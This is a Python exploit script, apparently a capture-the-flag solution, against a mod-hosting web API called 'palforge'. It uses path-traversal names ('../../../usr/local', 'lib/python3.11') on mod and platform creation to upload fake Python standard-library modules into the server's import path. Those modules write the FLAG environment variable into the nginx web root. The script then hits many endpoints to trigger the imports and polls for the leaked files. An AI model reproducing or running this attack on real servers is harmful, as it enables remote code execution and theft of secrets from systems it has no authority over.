import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = pf.BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u

tok,u=fresh()
mods = ["crypt","fcntl","select","termios","pty","spwd","grp","resource","syslog","cgi","secrets",
        "hmac","token","glob","fnmatch","shutil","posix","getopt","profile","pstats","rlcompleter",
        "reprlib","types","enum","shelve","dbm","plistlib","pickletools","sndhdr","uu","wave"]
files = {}
for m in mods:
    files[m+".py"] = f'import os\nopen("/usr/share/nginx/html/zz_{m}","w").write(os.environ.get("FLAG","NOFLAG"))\n'.encode()
pid = pf.create_platform(tok, "lib/python3.11", name="z")
mid = pf.create_mod(tok, "../../../usr/local", title="z")
bid = pf.create_build(tok, mid, pid)
r = pf.upload_zip(tok, mid, bid, files)
print("plant", len(files), "modules ->", r.status_code, r.text[:60])

# trigger many endpoints
h={"Authorization":f"Bearer {tok}"}
requests.post(f"{BASE}/api/auth/register/", json={"username":"q%d"%random.randint(1000,9999),"password":"pass12345","full_name":"z"}, timeout=10)
lg = requests.post(f"{BASE}/api/auth/login/", json={"username":u,"password":"pass12345"}, timeout=10)
lgj = lg.json()
requests.post(f"{BASE}/api/auth/token/refresh/", json={"refresh":lgj.get("refresh","")}, timeout=10)
requests.get(f"{BASE}/api/auth/me/", headers=h, timeout=10)
requests.get(f"{BASE}/api/mods/", headers=h, timeout=10)
requests.get(f"{BASE}/api/platforms/", headers=h, timeout=10)
requests.get(f"{BASE}/api/schema/", timeout=10)
requests.get(f"{BASE}/api/docs/", timeout=10)
# large upload (TemporaryFileUploadHandler)
pid2=pf.create_platform(tok, "t%d"%random.randint(0,9999), name="z"); mid2=pf.create_mod(tok,"v%d"%random.randint(0,9999),title="z"); bid2=pf.create_build(tok,mid2,pid2)
bio=io.BytesIO()
with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as zf: zf.writestr("b.bin", b"A"*(5*1024*1024))
bio.seek(0)
requests.post(f"{BASE}/api/mods/{mid2}/builds/{bid2}/upload/", headers=h, files={"zip_file":("p.zip",bio,"application/zip")}, timeout=30)
requests.get(f"{BASE}/media/builds/2.4.1/win1584/real.txt", timeout=8)
time.sleep(2)
found=[]
for m in mods:
    c=requests.get(f"{BASE}/zz_{m}", timeout=6)
    if c.status_code==200 and "doctype" not in c.text[:40].lower():
        found.append((m, c.text[:60]))
print("FIRED:", found)
